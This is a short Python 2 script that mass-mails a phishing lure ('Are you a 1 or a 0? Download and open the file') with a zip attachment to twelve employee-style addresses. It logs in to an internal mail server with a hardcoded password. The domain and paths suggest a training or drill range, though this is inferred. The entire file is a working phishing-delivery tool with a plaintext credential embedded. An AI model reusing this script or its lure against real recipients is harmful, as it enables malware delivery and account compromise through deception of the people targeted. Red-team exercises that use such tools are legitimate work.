import smtplib
import os
import urllib2
import time
from email.Utils import formatdate
from email.mime.text import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email import Encoders
import random

def main():
	path = '/root/saigon2/KB_MaDoc/2'
	os.chdir(path)

	userlist = ['nhanvien01@dientap.cnsc', 'nhanvien02@dientap.cnsc', 'nhanvien03@dientap.cnsc', 'nhanvien04@dientap.cnsc', 'nhanvien05@dientap.cnsc', 'nhanvien06@dientap.cnsc', 'nhanvien07@dientap.cnsc', 'nhanvien08@dientap.cnsc', 'nhanvien09@dientap.cnsc', 'nhanvien10@dientap.cnsc', 'hieu@dientap.cnsc', 'vuong@dientap.cnsc']
	#userlist = ['nhanvien05@dientap.cnsc']
	for user in userlist:
		me = 'john@dientap.cnsc'
		you = user

		msg = MIMEMultipart()
		msg['From'] = me
		msg['To'] = you
		msg['Subject'] = 'Subject'
		msg['Date'] = formatdate(localtime=True)

		# noi dung email
		text = 'Hello Friend. \nAre you a 1 or a 0? \nDownload and open the file if you are the 1.'
		msg.attach(MIMEText(text))

		# attachment file setup.rar
		file = 'votay.zip'
		part = MIMEBase('application', "octet-stream")
		part.set_payload( open(file,"rb").read() )
		Encoders.encode_base64(part)
		part.add_header('Content-Disposition', 'attachment; filename="%s"'
		               % os.path.basename(file))
		msg.attach(part)


		s = smtplib.SMTP_SSL('192.168.220.51')
		s.login(me, 'Cnsc12345')
		s.sendmail(me, you, msg.as_string())
		s.quit()
		print 'Sending to ' + user
		time.sleep(random.randint(1,2))

	print 'Sent'

main()
